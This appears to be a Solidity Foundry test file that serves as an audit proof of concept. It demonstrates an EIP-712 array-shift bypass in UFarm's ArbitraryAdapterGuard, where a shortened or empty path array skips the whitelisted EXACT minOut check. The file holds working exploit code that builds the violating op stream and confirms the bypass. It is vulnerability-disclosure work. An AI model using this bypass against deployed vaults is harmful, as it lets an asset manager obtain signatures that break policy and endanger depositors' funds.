// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {ArbitraryAdapterGuard} from "../src/adapters/ArbitraryAdapterGuard.sol";
import {IArbitraryAdapterGuard} from "../src/interfaces/IArbitraryAdapter.sol";
import {MockCore} from "../src/mocks/MockCore.sol";

/// @title UFarm — EIP-712 array-shift guard bypass: short op stream skips trailing directive constraints
///
/// Bug: ArbitraryAdapterGuard.eip712Hash matches an EIP-712 op stream
/// against whitelisted SignDirectives positionally with one global
/// fieldCount, and never checks that all of a directive's headers were
/// consumed (no fieldCount == directive.length check). A variable-length
/// array makes the stream shorter in a way the target dapp still accepts:
/// fields after the array shift left onto earlier, permissive TYPE_ANY
/// headers, and the trailing TYPE_EXACT constraint is never evaluated.
/// Impact: a VAULT_ASSET_MANAGER — who may call signMessage() but may NOT
/// set policy — can obtain a vault signature for a message that violates
/// core-set policy (e.g. a swap with minOut = 0 instead of the whitelisted
/// EXACT 1000). The returned digest is the valid EIP-712 digest of the
/// violating message, so a conforming dapp would accept the signature.
/// Measured: whitelisted Swap(path[3], minOut EXACT 1000); a 1-element
/// path with minOut = 0 returns a non-zero digest equal to the
/// independently computed EIP-712 digest of the violating message.
/// Severity: High
/// Affected: UFarm-EVM-Contracts commit b19a6511c61157bfd68df1c28f0299e68bde02fb
/// ("Production Release 2.1.1"), contracts/adapters/ArbitraryAdapterGuard.sol
/// eip712Hash L224, _matchSignDirective L374, _eip712BeginStruct L429,
/// _eip712Field L465.
contract EIP712ArrayShiftPoC is Test {
    bytes32 internal constant DAPP = keccak256("DAPP");
    bytes32 internal constant DOMAIN = keccak256("DOMAIN");
    bytes32 internal immutable TYPEHASH = keccak256("Swap(address[] path,uint256 minOut)");

    uint8 internal constant OP_DOMAIN = 0;
    uint8 internal constant OP_BEGIN_STRUCT = 1;
    uint8 internal constant OP_FIELD = 2;
    uint8 internal constant OP_END_STRUCT = 3;
    uint8 internal constant OP_BEGIN_ARRAY = 4;
    uint8 internal constant OP_END_ARRAY = 5;

    uint8 internal constant TYPE_ANY = 1;
    uint8 internal constant TYPE_EXACT = 4;

    ArbitraryAdapterGuard internal guard;

    function setUp() public {
        MockCore core = new MockCore();
        guard = new ArbitraryAdapterGuard(address(core));
    }

    function _exactHeader(uint256 idx) internal pure returns (uint8) {
        return uint8((TYPE_EXACT << 5) | idx);
    }

    function _anyHeader() internal pure returns (uint8) {
        return uint8(TYPE_ANY << 5);
    }

    /// @dev Whitelist the honest 3-element-path directive: minOut EXACT 1000.
    function _whitelistHonest() internal {
        uint8[] memory headers = new uint8[](5);
        headers[0] = _exactHeader(0); // typehash
        headers[1] = _anyHeader(); // path[0]
        headers[2] = _anyHeader(); // path[1]
        headers[3] = _anyHeader(); // path[2]
        headers[4] = _exactHeader(1); // minOut == 1000
        bytes memory dictionary = abi.encodePacked(TYPEHASH, bytes32(uint256(1000)));

        IArbitraryAdapterGuard.SignDirective[] memory dirs = new IArbitraryAdapterGuard.SignDirective[](1);
        dirs[0] = IArbitraryAdapterGuard.SignDirective({directives: headers, dictionary: dictionary});
        guard.whitelistEIP712(DAPP, DOMAIN, dirs);
    }

    function _buildSwapOps(bytes32[] memory path, uint256 minOut) internal view returns (bytes memory) {
        bytes memory ops = abi.encodePacked(OP_DOMAIN, DOMAIN, OP_BEGIN_STRUCT, TYPEHASH, OP_BEGIN_ARRAY);
        for (uint256 i = 0; i < path.length; i++) {
            ops = abi.encodePacked(ops, OP_FIELD, path[i]);
        }
        ops = abi.encodePacked(ops, OP_END_ARRAY, OP_FIELD, bytes32(minOut), OP_END_STRUCT);
        return ops;
    }

    /// @dev Independent EIP-712 digest for Swap(path, minOut) — what a target
    /// dapp would compute when verifying the signature.
    function _expectedDigest(bytes32[] memory path, uint256 minOut) internal view returns (bytes32) {
        bytes32 arrayHash = keccak256(abi.encodePacked(path));
        bytes32 structHash = keccak256(abi.encode(TYPEHASH, arrayHash, minOut));
        return keccak256(abi.encodePacked("\x19\x01", DOMAIN, structHash));
    }

    function test_honestFullLengthMessageIsAllowed() public {
        _whitelistHonest();
        bytes32[] memory path = new bytes32[](3);
        path[0] = bytes32(uint256(0x1111));
        path[1] = bytes32(uint256(0x2222));
        path[2] = bytes32(uint256(0x3333));
        bytes32 digest = guard.eip712Hash(DAPP, _buildSwapOps(path, 1000));
        console.log("HONEST message (path 3 elems, minOut 1000) allowed, digest:");
        console.logBytes32(digest);
        assertEq(digest, _expectedDigest(path, 1000), "honest message must be allowed");
        assertTrue(digest != bytes32(0));
    }

    function test_controlFullLengthWrongMinOutIsRejected() public {
        _whitelistHonest();
        bytes32[] memory path = new bytes32[](3);
        path[0] = bytes32(uint256(0x1111));
        path[1] = bytes32(uint256(0x2222));
        path[2] = bytes32(uint256(0x3333));
        // Same shape, minOut=0 violates EXACT(1000) -> must be rejected.
        bytes32 rejected = guard.eip712Hash(DAPP, _buildSwapOps(path, 0));
        console.log("CONTROL full-length minOut=0 rejected (digest == 0):", rejected == bytes32(0));
        assertEq(rejected, bytes32(0), "full-length minOut=0 must be rejected");
    }

    function test_bypass_shortArraySkipsTrailingExactConstraint() public {
        _whitelistHonest();
        bytes32[] memory path = new bytes32[](1);
        path[0] = bytes32(uint256(0x1111));
        // minOut=0 violates the whitelisted EXACT(1000) constraint, but the
        // 1-element array shifts it onto an ANY header; headers 3-4 are
        // never evaluated. Guard must return 0; instead it returns a digest.
        bytes32 digest = guard.eip712Hash(DAPP, _buildSwapOps(path, 0));
        console.log("WHITELISTED minOut (EXACT):", uint256(1000));
        console.log("SUBMITTED path length:", path.length);
        console.log("SUBMITTED minOut:", uint256(0));
        console.log("GUARD RETURNED DIGEST (non-zero = policy bypass):");
        console.logBytes32(digest);
        console.log("EXPECTED VALID EIP-712 DIGEST OF THE VIOLATING MESSAGE:");
        console.logBytes32(_expectedDigest(path, 0));
        assertTrue(digest != bytes32(0), "BUG: guard returned a digest for policy-violating message");
        assertEq(
            digest,
            _expectedDigest(path, 0),
            "BUG: returned digest is the valid EIP-712 digest of the violating message"
        );
    }

    function test_bypass_emptyArraySkipsTrailingExactConstraint() public {
        _whitelistHonest();
        bytes32[] memory path = new bytes32[](0);
        bytes32 digest = guard.eip712Hash(DAPP, _buildSwapOps(path, 0));
        console.log("WHITELISTED minOut (EXACT):", uint256(1000));
        console.log("SUBMITTED path length:", path.length);
        console.log("SUBMITTED minOut:", uint256(0));
        console.log("GUARD RETURNED DIGEST (non-zero = policy bypass):");
        console.logBytes32(digest);
        console.log("EXPECTED VALID EIP-712 DIGEST OF THE VIOLATING MESSAGE:");
        console.logBytes32(_expectedDigest(path, 0));
        assertTrue(digest != bytes32(0), "BUG: empty array also skips the trailing constraint");
        assertEq(digest, _expectedDigest(path, 0), "BUG: empty-array digest is valid EIP-712");
    }
}
